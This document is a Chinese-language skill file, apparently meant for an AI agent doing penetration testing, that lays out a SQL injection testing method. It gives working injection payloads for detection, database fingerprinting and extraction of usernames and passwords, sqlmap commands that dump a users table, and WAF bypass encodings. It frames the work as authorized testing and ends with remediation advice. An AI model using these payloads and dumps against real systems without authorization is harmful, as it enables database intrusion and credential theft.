---
name: sql-injection-testing
description: SQL注入测试的专业技能和方法论
version: 1.0.0
---

# SQL注入测试技能

## 使用边界与发散原则

- 本 skill 是最低覆盖要求、风险清单和证据标准，不是唯一测试路径或固定脚本。执行时必须根据目标技术栈、入口形态、认证状态、业务流程、已有证据、WAF/限速和授权范围调整方法。
- 文中的步骤、payload、命令、工具名和执行顺序默认是候选方法；除非本 skill、系统提示或后端门禁明确写为“必须/禁止/强制”，不要照抄固定列表，也不要因为示例没覆盖某个旁路、协议、参数位置、文件格式或业务入口就跳过。
- 发现阶段的字符串、端点、token、id、报错、组件名和扫描命中只作为候选信号；先记录和复核，不要仅凭单个关键词直接认定漏洞或加载多个无关专项流程。只有交互证据、可复现行为或明确进入对应专项测试时，才提升为专项验证。
- 每一步都应输出证据、判断理由和下一步分支；工具失败时先修参数、配置、环境或改用更合适的专业工具，确认无法覆盖时再使用通用命令兜底。
- 授权范围、低噪声、数据最小化、复现证据、误报排除和报告要求是硬边界；这些约束高于任何示例命令或默认流程。

## 概述

SQL注入是一种常见且危险的Web应用漏洞。本技能提供了系统化的SQL注入测试方法、检测技术和利用策略。

## 测试方法

### 1. 参数识别
- 识别所有用户输入点：URL参数、POST数据、HTTP头、Cookie等
- 重点关注：id、search、filter、sort等参数
- 使用Burp Suite或类似工具拦截和修改请求

### 2. 基础检测

**重要：以下 payload 仅为参考方向。必须先分析目标的数据库类型、WAF规则、过滤逻辑，然后动态构造针对性注入语句。不要直接复制这些payload，要根据实际情况调整。**
- 单引号测试：`'` - 查看是否出现SQL错误
- 布尔盲注：`' AND '1'='1` vs `' AND '1'='2`
- 时间盲注：`' AND SLEEP(5)--`
- 联合查询：`' UNION SELECT NULL--`

### 3. 数据库识别
- MySQL：`' AND @@version LIKE '%mysql%'--`
- PostgreSQL：`' AND version() LIKE '%PostgreSQL%'--`
- MSSQL：`' AND @@version LIKE '%Microsoft%'--`
- Oracle：`' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`

### 4. 信息提取
- 数据库名：`' UNION SELECT database()--`
- 表名：`' UNION SELECT table_name FROM information_schema.tables--`
- 列名：`' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
- 数据提取：`' UNION SELECT username,password FROM users--`

## 工具使用

### sqlmap
```bash
# 基础扫描
sqlmap -u "http://target.com/page?id=1"

# 指定参数
sqlmap -u "http://target.com/page" --data="id=1" --method=POST

# 指定数据库类型
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# 获取数据库列表
sqlmap -u "http://target.com/page?id=1" --dbs

# 获取表
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# 获取数据
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

### 手动测试
- 使用Burp Suite的Repeater模块
- 使用浏览器开发者工具
- 编写Python脚本自动化测试

## 绕过技术

### WAF绕过
- 编码绕过：URL编码、Unicode编码、十六进制编码
- 注释绕过：`/**/`, `--`, `#`
- 大小写混合：`SeLeCt`, `UnIoN`
- 空格替换：`/**/`, `+`, `%09`(Tab), `%0A`(换行)

### 示例
```
原始：' UNION SELECT NULL--
绕过1：'/**/UNION/**/SELECT/**/NULL--
绕过2：'%55nion%20select%20null--
绕过3：'/*!UNION*//*!SELECT*/null--
```

## 验证和报告

### 验证步骤
1. 确认可以执行SQL语句
2. 提取数据库信息验证
3. 评估影响范围（数据泄露、权限提升等）
4. 记录完整的POC（请求/响应）

### 报告要点
- 漏洞位置和参数
- 影响的数据和系统
- 完整的利用步骤
- 修复建议（参数化查询、输入验证等）

## 注意事项

- 仅在授权测试环境中进行
- 避免对生产数据造成破坏
- 谨慎使用DROP、DELETE等危险操作
- 记录所有测试步骤以便复现
